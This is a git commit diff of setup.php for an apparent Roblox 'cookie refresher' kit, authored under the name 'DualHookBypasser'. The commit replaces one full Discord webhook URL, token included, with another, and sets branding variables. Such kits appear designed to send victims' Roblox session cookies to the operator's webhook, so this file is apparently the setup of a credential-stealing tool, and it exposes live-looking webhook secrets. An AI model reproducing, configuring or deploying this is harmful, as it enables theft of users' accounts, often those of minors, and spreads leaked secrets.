ffef1eef6a9ecf29b0e05b17299238e3d6245b91
DualHookBypasser <dualhookbypasser@gmail.com>
2025-10-08 13:54:30 +0800

    Update setup.php

--- setup.php
+++ setup.php
@@ -1,8 +1,9 @@
 <?php
 
-$name = "hpzeren on top"; // cookie refresher name
-$webhook = "https://discord.com/api/webhooks/1276287771199275140/IgmIUiZ1_ZW0_ZY7qgW8RHymnfVwM9qFoF9osGDkwVwcEnpRn-ADjKTrkSLyHxQT-xEU";
+$name = "RBLX ON TOP"; // cookie refresher name
+$webhook = "https://discord.com/api/webhooks/1420600488663187610/4mh78h9beHKv_x69ZklQPZKOtH8e_AbYmx7k-p6k30BjUGDRSkwVzoC0_es2JE7SD6Ki";
 $image = ""; // cookie refresher image / background
 $html_icon = "https://tse4.mm.bing.net/th?id=OIP.HgjTrduHboOjui_U9tcE2QHaDj&pid=Api&P=0&h=180"; // cookie refresher web icon
 // credits daddy hpzeren
+
 ?>
